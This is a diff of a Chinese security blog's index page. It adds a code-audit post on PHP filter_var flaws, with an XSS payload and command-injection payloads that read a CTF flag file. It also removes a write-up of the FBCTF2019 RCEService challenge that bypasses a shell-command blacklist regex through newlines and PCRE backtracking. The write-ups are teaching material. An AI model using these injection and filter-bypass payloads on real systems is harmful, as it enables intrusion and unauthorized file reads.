@@ -182,6 +182,127 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/04/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-filter-var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/04/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-filter-var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/" class="post-title-link" itemprop="url">代码审计-- filter_var函数缺陷</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-04-24 21:15:43 / 修改时间：21:16:32" itemprop="dateCreated datePublished" datetime="2020-04-24T21:15:43+08:00">2020-04-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" itemprop="url" rel="index">
+                    <span itemprop="name">基础积累</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>12 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; composer require &quot;twig&#x2F;twig&quot;</span><br><span class="line">require &#39;vendor&#x2F;autoload.php&#39;;</span><br><span class="line"></span><br><span class="line">class Template &#123;</span><br><span class="line">  private $twig;</span><br><span class="line"></span><br><span class="line">  public function __construct() &#123;</span><br><span class="line">    $indexTemplate &#x3D; &#39;&lt;img &#39; .</span><br><span class="line">      &#39;src&#x3D;&quot;https:&#x2F;&#x2F;loremflickr.com&#x2F;320&#x2F;240&quot;&gt;&#39; .</span><br><span class="line">      &#39;&lt;a href&#x3D;&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;&#x2F;a&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Default twig setup, simulate loading</span><br><span class="line">    &#x2F;&#x2F; index.html file from disk</span><br><span class="line">    $loader &#x3D; new Twig\Loader\ArrayLoader([</span><br><span class="line">      &#39;index.html&#39; &#x3D;&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    $this-&gt;twig &#x3D; new Twig\Environment($loader);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function getNexSlideUrl() &#123;</span><br><span class="line">    $nextSlide &#x3D; $_GET[&#39;nextSlide&#39;];</span><br><span class="line">    return filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function render() &#123;</span><br><span class="line">    echo $this-&gt;twig-&gt;render(</span><br><span class="line">      &#39;index.html&#39;,</span><br><span class="line">      [&#39;link&#39; &#x3D;&gt; $this-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(new Template())-&gt;render();</span><br></pre></td></tr></table></figure>
+<p>在<code>__construct</code>初始化一个将要显示的东西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&#123;&#123;link|escape&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里过滤了link <a href="https://twig.symfony.com/doc/2.x/filters/escape.html" target="_blank" rel="noopener">【了解escape过滤】</a>  然后又使用了<code>filter_var</code>函数对将要传入的link做了过滤。最后渲染显示出来，我猜测是xss、模板注入的漏洞。 </p>
+<h3 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h3><h4 id="绕过escape"><a href="#绕过escape" class="headerlink" title="绕过escape"></a>绕过escape</h4><p>实际上这里的 escape 过滤器，是用PHP内置函数 htmlspecialchars 来实现的，<a href="https://twig.symfony.com/doc/2.x/filters/escape.html" target="_blank" rel="noopener">【具体看这里】</a> 。就是将特殊字符转换为 HTML 实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; (&amp; 符号)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &amp;</span><br><span class="line">&quot; (双引号)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &quot;</span><br><span class="line">&#39; (单引号)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &amp;apos;</span><br><span class="line">&lt; (小于号)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &lt;</span><br><span class="line">&gt; (大于号)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &gt;</span><br></pre></td></tr></table></figure>
+<p>我们只要不使用这些符号不就直接绕过了。</p>
+<h4 id="绕过-filter-var"><a href="#绕过-filter-var" class="headerlink" title="绕过 filter_var"></a>绕过 filter_var</h4><p>这里我们了解一下它的过滤规则有哪些（有很多我就放几个我觉得常用的）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FILTER_SANITIZE_STRING（默认） 	去除标签，去除或编码特殊字符。</span><br><span class="line">FILTER_SANITIZE_URL 	删除所有字符，除了字母、数字以及 $-_.+!*&#39;(),&#123;&#125;|\^~[]&#96;&lt;&gt;#%&quot;;&#x2F;?:@&amp;&#x3D;</span><br><span class="line">FILTER_SANITIZE_MAGIC_QUOTES 	应用 addslashes()。</span><br><span class="line">FILTER_VALIDATE_URL 	把值作为 URL 来验证。</span><br><span class="line">FILTER_VALIDATE_IP 	把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围。</span><br></pre></td></tr></table></figure>
+<p>这里题目用的是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FILTER_VALIDATE_URL 过滤器来判断是否是一个合法的url</span><br></pre></td></tr></table></figure>
+<p>FILTER_VALIDATE_URL 可能的标志（第三个参数,默认全部）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FILTER_FLAG_SCHEME_REQUIRED - 要求 URL 是 RFC 兼容 URL（比如 http:&#x2F;&#x2F;example）</span><br><span class="line">FILTER_FLAG_HOST_REQUIRED - 要求 URL 包含主机名（比如 http:&#x2F;&#x2F;www.example.com）</span><br><span class="line">FILTER_FLAG_PATH_REQUIRED - 要求 URL 在域名后存在路径（比如 www.example.com&#x2F;example1&#x2F;test2&#x2F;）</span><br><span class="line">FILTER_FLAG_QUERY_REQUIRED - 要求 URL 存在查询字符串（比如 &quot;example.php?name&#x3D;Peter&amp;age&#x3D;37&quot;）</span><br></pre></td></tr></table></figure>
+
+<h4 id="综合绕过"><a href="#综合绕过" class="headerlink" title="综合绕过"></a>综合绕过</h4><p>通过上面的分析我们可以使用payload为：<code>url=javascript://comment％250aalert(1)</code> 来进行绕过。<br>这里的<code>//</code>在javascript中是单行注释，所以我们后面加一个<code>%0A</code> 换行进行绕过可以执行alert函数。<br>需要注意的我们得给<code>%</code>进行url编码为<code>%25</code> 因为浏览器会自动解码一次。<br>此时我们单击我们的连接就可以弹出<code>1</code>  xss测试成功。</p>
+<h3 id="ctf-题目源码"><a href="#ctf-题目源码" class="headerlink" title="ctf 题目源码"></a>ctf 题目源码</h3><p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; index.php</span><br><span class="line">&lt;?php </span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info &#x3D; parse_url($url);</span><br><span class="line">    if(preg_match(&#39;&#x2F;sec-redclub.com$&#x2F;&#39;,$site_info[&#39;host&#39;]))&#123;</span><br><span class="line">        exec(&#39;curl &quot;&#39;.$site_info[&#39;host&#39;].&#39;&quot;&#39;, $result);</span><br><span class="line">        echo &quot;&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info[&#39;host&#39;]&#125; successfully!&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">              &lt;center&gt;&lt;textarea rows&#x3D;&#39;20&#39; cols&#x3D;&#39;90&#39;&gt;&quot;;</span><br><span class="line">        echo implode(&#39; &#39;, $result); &#x2F;&#x2F;将元组转为字符串</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;br&gt;</span><br><span class="line">          &lt;center&gt;&lt;h3&gt;For example:?url&#x3D;http:&#x2F;&#x2F;sec-redclub.com&lt;&#x2F;h3&gt;&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$flag &#x3D; &quot;HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h4><p>使用 filter_Var 进行过滤我们输入的$url然后规定其必须以<code>sec-redclub.com</code> 结尾。最后将我们$url <code>host</code>部分进行拼接执行、输出。很显然这里我们可以命令执行。</p>
+<h4 id="使用命令执行-type"><a href="#使用命令执行-type" class="headerlink" title="使用命令执行  type"></a>使用命令执行  type</h4><p>这里我们可以构造一个payload为<code>?url=data://&quot;||type=flag.php;sec-redclub.com</code> 当然data改为其它的也可以，但是http不可以无法过filter_ver。<br>这个是可以通过几个验证的，最后拼接为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#39;curl &quot;data:&#x2F;&#x2F;&quot;||type&#x3D;flag.php;sec-redclub.com&quot;&#39;, $result);</span><br></pre></td></tr></table></figure>
+<p>分析一下，先执行<code>curl &quot;data://&quot;</code>分号都没有加上不完整肯定是无法执行的，然后就执行<code>type=flag.php</code>这里强调一下 <strong>type</strong> 它是Windows下读取文件的命令。 然后后面的忽略，把结果给了<code>$result</code>到后面还有将它输出的语句。</p>
+<h4 id="利用文件包含"><a href="#利用文件包含" class="headerlink" title="利用文件包含"></a>利用文件包含</h4><p>&emsp;如果你想不到可以用<code>type</code> 那我们可以用文件包含 <code>include</code> 但是flag文件是php无法显示，我们可以再执行一个输出变量的命令。如我们需要构造成这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#39;curl &quot;&quot;&#39;);include(&quot;flag.php&quot;);echo($flag);exec(&#39;&quot;sec-redclub.com&quot;&#39;, $result);</span><br></pre></td></tr></table></figure>
+<p>所以最后我们的payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;dasta:&#x2F;&#x2F;&quot;&#39;);include(&quot;flag.php&quot;);echo($flag);exec(&#39;&quot;sec-redclub.com</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>开始做题目时我输入的<code>&#39;  &#39; \</code>等特殊符号都会被反义，经过百度发现是 <code>PHP魔术引号</code> 也就是php配置导致的。他们分别是：</p>
+<blockquote>
+<p>magic_quotes_gpc<br>影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。<br>这个开启时，通过GET,POST,COOKIE传递的数据会自动被转义。</p>
+</blockquote>
+<blockquote>
+<p>magic_quotes_sybase<br>如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ”。而双引号、反斜线 和 NULL 字符将不会进行转义。  </p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/04/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-in-array%E5%87%BD%E6%95%B0%E7%9A%84%E7%BC%BA%E9%99%B7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -611,110 +732,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/04/21/FBCTF2019-RCEService/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="信安小蚂蚁">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="信安小蚂蚁">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/04/21/FBCTF2019-RCEService/" class="post-title-link" itemprop="url">[FBCTF2019]RCEService</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-04-21 14:55:40 / 修改时间：14:59:45" itemprop="dateCreated datePublished" datetime="2020-04-21T14:55:40+08:00">2020-04-21</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF复现</span>
-                  </a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>&emsp;这题看了wp，最大的疑惑就是源码怎么看到的？</p>
-<h3 id="读题"><a href="#读题" class="headerlink" title="读题"></a>读题</h3><ol>
-<li>打开题目提示，输入JSON类型来执行命令。<a href="https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html" target="_blank" rel="noopener">【JSON常识】</a></li>
-<li>JSON 需要给一个键值对，执行命令的话我们猜测是cmd键于是输入<code>{"cmd":"ls"} </code> 得到了回显index.php 尝试使用<code>{&quot;cmd&quot;:&quot;cat index.php&quot;}</code> , 返回: Hacking attempt detected 估计过滤了cat 。</li>
-<li>网上找到了源码如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#39;cmd&#39;])) &#123;</span><br><span class="line">  $json &#x3D; $_REQUEST[&#39;cmd&#39;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\&#x2F;;-@\[-&#96;|~\x7F]+).*$&#x2F;&#39;, $json)) &#123;</span><br><span class="line">    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">    $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;];</span><br><span class="line">    if ($cmd !&#x3D;&#x3D; NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &#39;Invalid input&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
-<li>代码中使用<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code> 配置系统环境变量，而我们用不了 cat 也有可能是在这个环境变量下没有这个二进制文件。我们可以直接使用<code>/bin/cat</code> 来调用cat命令。</li>
-<li>Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</li>
-</ol>
-<h3 id="多行绕过preg-match-来解题"><a href="#多行绕过preg-match-来解题" class="headerlink" title="多行绕过preg_match 来解题"></a>多行绕过preg_match 来解题</h3><p>&emsp; <strong>因为preg_match只会去匹配第一行，所以这里可以用多行进行绕过</strong>  </p>
-<ol>
-<li>我们使用payload <code>{%0A"cmd":"ls /home/rceservice/jail"%0A}</code> （%A是换行）得到回显 ls 一个文件，这也再一次说明当前环境下有 ls命令 没有其它命令。</li>
-<li>使用payload <code>{%0A"cmd":"ls /home/rceservice"%0A}</code> 得到回显，flag jail 。也就是说 flag 在flag里。</li>
-<li>使用<code>{%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}</code> 得到flag。</li>
-</ol>
-<h3 id="利用PCRE回溯来绕过-preg-match"><a href="#利用PCRE回溯来绕过-preg-match" class="headerlink" title="利用PCRE回溯来绕过 preg_match"></a>利用PCRE回溯来绕过 preg_match</h3><p>&emsp;先了解一下什么是PCRE回溯，<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">【看这里】</a>。   </p>
-<ol>
-<li>由上面的方法知道了，想要得到flag要访问<code>/bin/cat /home/rceservice/flag</code> 。</li>
-<li>根据PCRE回溯的方法解题，需要用POST发送请求，因为GET会因为头太大报错。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">414 Request-URI Too Large</span><br></pre></td></tr></table></figure></li>
-<li>所以我们使用的脚本如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">### 不知道为啥这里用 || 不可以执行我们的命令</span><br><span class="line">payload &#x3D; &#39;&#123;&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag &quot;,&quot;nayi&quot;:&quot;&#39; + &quot;a&quot;*(1000000) + &#39;&quot;&#125;&#39; ##超过一百万，这里写一千万不会出结果。</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;b27f0703-fe79-470f-b1fb-f7cfbd8c966b.node3.buuoj.cn&#x2F;&quot;, data&#x3D;&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
-即可得到flag</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -786,18 +803,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-count">135</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-count">86</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
